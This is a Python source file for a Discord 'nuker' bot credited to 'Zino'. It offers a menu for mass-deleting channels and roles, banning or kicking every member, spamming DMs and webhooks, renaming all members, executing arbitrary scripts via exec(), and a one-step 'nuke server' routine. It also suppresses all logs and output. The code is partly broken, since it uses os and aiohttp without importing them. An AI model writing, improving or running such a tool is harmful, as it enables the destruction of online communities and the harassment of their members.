import discord
from discord.ext import commands
import logging
import asyncio
import random
import sys

# Suppress all logs by setting the logging level to CRITICAL
logging.basicConfig(level=logging.CRITICAL)

# Suppress discord.py logs
logger = logging.getLogger('discord')
logger.setLevel(logging.CRITICAL)

# Suppress asyncio logs
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

# Suppress all output to stdout and stderr
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

def print_title():
    title = """
\033[92m
  _____  _   _  _   _  _   _  _  __   _  _  __  _  
 / ____|| \ | || \ | || \ | || ||  \ | || |/ / | | 
| |     |  \| ||  \| ||  \| || ||   \| || ' /  | | 
| |     | . ` || . ` || . ` || || . ` ||  <   | | 
| |____ | |\  || |\  || |\  || || |\  || . \  | |____
 \_____| |_| \_||_| \_||_| \_||_||_| \_||_|\_\ |______|
\033[0m
\033[92mMade by Zino\033[0m
"""
    print(title)

def get_bot_token_and_server_id():
    bot_token = input("Please enter your Bot Token: ")
    server_id = int(input("Please enter the Server ID: "))
    return bot_token, server_id

@bot.event
async def on_ready():
    print(f"\033[92mLogged in as {bot.user.name}\033[0m")
    await menu()

async def menu():
    print("\033[92m" + """
┌─────────────────────────────────────────────────────────┐
│ [ 1] Delete all channels       │ [11] Rename server       │
│ [ 2] Create channels           │ [12] Mass create threads │
│ [ 3] Create roles              │ [13] Webhook spammer     │
│ [ 4] Add webhooks              │ [14] Delete webhook      │
│ [ 5] Kick all members          │ [15] Delete all webhooks │
│ [ 6] Ban all members           │ [16] Server info         │
│ [ 7] Unban all members         │ [17] Rename all members  │
│ [ 8] Copy server               │ [18] Execute script      │
│ [ 9] DM all members            │ [19] Nuke server         │
│ [10] Create/delete channels    │                          │
└─────────────────────────────────────────────────────────┘
\033[0m
    """)

    try:
        option = int(input("\033[92mSelect an option (1-19): \033[0m"))
    except ValueError:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        print(
            f"\033[91mThe bot is not connected to the server with ID {server_id}. Please check your Server ID.\033[0m"
        )
        return

    # Map options to functions
    actions = {
        1: delete_all_channels,
        2: create_channels,
        3: create_roles,
        4: add_webhooks,
        5: kick_all_members,
        6: ban_all_members,
        7: unban_all_members,
        8: copy_server,
        9: dm_all_members,
        10: create_and_delete_channels,
        11: rename_server,
        12: mass_create_threads,
        13: webhook_spammer,
        14: delete_webhook,
        15: delete_all_webhooks,
        16: server_info,
        17: rename_all_members,
        18: custom_script,
        19: nuke_server
    }

    action = actions.get(option)
    if action:
        await action(guild)
    else:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()

async def delete_all_channels(guild):
    print("\033[92m[ Deleting all channels... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    await menu()

async def create_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        await create_channels(guild)
        return

    print(f"\033[92m[ Creating {channel_count} channels... ]\033[0m")
    for _ in range(channel_count):
        await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
    print(f"Created {channel_count} channels.")
    await menu()

async def create_roles(guild):
    role_name = input("Enter name for roles: ")
    try:
        role_count = int(input("How many roles to create: "))
    except ValueError:
        print("\033[91mInvalid number of roles. Please enter a valid integer.\033[0m")
        await create_roles(guild)
        return

    print(f"\033[92m[ Creating {role_count} roles... ]\033[0m")
    for _ in range(role_count):
        await guild.create_role(name=role_name)
    print(f"Created {role_count} roles.")
    await menu()

async def add_webhooks(guild):
    webhook_name = input("Enter name for webhooks: ")
    try:
        webhook_count = int(input("How many webhooks to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of webhooks. Please enter a valid integer.\033[0m")
        await add_webhooks(guild)
        return

    print(f"\033[92m[ Adding {webhook_count} webhooks to each channel... ]\033[0m")
    for channel in guild.text_channels:
        for _ in range(webhook_count):
            await channel.create_webhook(name=f"{webhook_name}-{random.randint(1000, 9999)}")
    print("Added webhooks to channels.")
    await menu()

async def kick_all_members(guild):
    print("\033[92m[ Kicking all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.kick(reason='Kicked by bot')
                print(f"Kicked {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot kick {member.name}")
    await menu()

async def ban_all_members(guild):
    print("\033[92m[ Banning all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason='Banned by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")
    await menu()

async def unban_all_members(guild):
    print("\033[92m[ Unbanning all members... ]\033[0m")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await guild.unban(user)
            print(f"Unbanned {user.name}")
        except discord.errors.Forbidden:
            print(f"Cannot unban {user.name}")
    await menu()

async def copy_server(guild):
    invite_link = input("Please enter the invite link of the server to copy from: ")
    print(f"Copying server from {invite_link} to {guild.name}...")
    # Placeholder for server copying functionality
    await menu()

async def dm_all_members(guild):
    message = input("Enter message to send to all members: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await dm_all_members(guild)
        return

    print(f"\033[92m[ Sending {message_count} messages to each member... ]\033[0m")
    for member in guild.members:
        if member != bot.user:
            try:
                for _ in range(message_count):
                    await member.send(message)
                    print(f"Sent message to {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot send message to {member.name}")
    await menu()

async def create_and_delete_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create and delete: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        await create_and_delete_channels(guild)
        return

    print(f"\033[92m[ Creating and deleting {channel_count} channels... ]\033[0m")
    for _ in range(channel_count):
        channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
        await channel.delete()
    print(f"Created and deleted {channel_count} channels.")
    await menu()

async def rename_server(guild):
    new_name = input("Enter new server name: ")
    try:
        await guild.edit(name=new_name)
        print(f"Server renamed to {new_name}")
    except discord.errors.Forbidden:
        print("Cannot rename server.")
    await menu()

async def mass_create_threads(guild):
    thread_name = input("Enter name for threads: ")
    try:
        thread_count = int(input("How many threads to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of threads. Please enter a valid integer.\033[0m")
        await mass_create_threads(guild)
        return

    print(f"\033[92m[ Creating {thread_count} threads in each channel... ]\033[0m")
    for channel in guild.text_channels:
        for _ in range(thread_count):
            try:
                await channel.create_thread(name=f"{thread_name}-{random.randint(1000, 9999)}")
                print(f"Created thread in {channel.name}")
            except discord.errors.Forbidden:
                print(f"Cannot create thread in {channel.name}")
    await menu()

async def webhook_spammer(guild):
    webhook_url = input("Enter webhook URL: ")
    message = input("Enter message to send: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await webhook_spammer(guild)
        return

    print(f"\033[92m[ Sending {message_count} messages to webhook... ]\033[0m")
    for _ in range(message_count):
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json={'content': message}) as response:
                if response.status == 204:
                    print("Message sent to webhook.")
                else:
                    print(f"Failed to send message. Status code: {response.status}")
    await menu()

async def delete_webhook(guild):
    webhook_id = input("Enter webhook ID to delete: ")
    try:
        webhook = await guild.fetch_webhook(webhook_id)
        await webhook.delete()
        print(f"Deleted webhook with ID {webhook_id}")
    except discord.errors.NotFound:
        print(f"Webhook with ID {webhook_id} not found.")
    await menu()

async def delete_all_webhooks(guild):
    print("\033[92m[ Deleting all webhooks... ]\033[0m")
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(f"Deleted webhook: {webhook.name}")
            except discord.errors.NotFound:
                print(f"Webhook not found: {webhook.name}")
    await menu()

async def server_info(guild):
    print("\033[92m[ Server Info ]\033[0m")
    print(f"Name: {guild.name}")
    print(f"ID: {guild.id}")
    print(f"Member Count: {guild.member_count}")
    print(f"Region: {guild.region}")
    print(f"Created At: {guild.created_at}")
    await menu()

async def rename_all_members(guild):
    new_name = input("Enter new name for all members: ")
    print(f"\033[92m[ Renaming all members to {new_name}... ]\033[0m")
    for member in guild.members:
        if member != bot.user:
            try:
                await member.edit(nick=new_name)
                print(f"Renamed {member.name} to {new_name}")
            except discord.errors.Forbidden:
                print(f"Cannot rename {member.name}")
    await menu()

async def custom_script(guild):
    script = input("Enter the path to the Python script to execute: ")
    try:
        exec(open(script).read())
        print(f"Executed script {script}")
    except Exception as e:
        print(f"Error executing script: {str(e)}")
    await menu()

async def nuke_server(guild):
    print("\033[92m[ Nuking server... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.Forbidden:
            print(f"Cannot delete channel: {channel.name}")

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except discord.errors.Forbidden:
                print(f"Cannot delete role: {role.name}")

    for member in guild.members:
        if member != bot.user:
            try:
                await member.ban(reason='Server nuked by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")

    print("\033[92mServer nuked successfully.\033[0m")
    await menu()

if __name__ == '__main__':
    print_title()
    bot_token, server_id = get_bot_token_and_server_id()
    bot.run(bot_token)
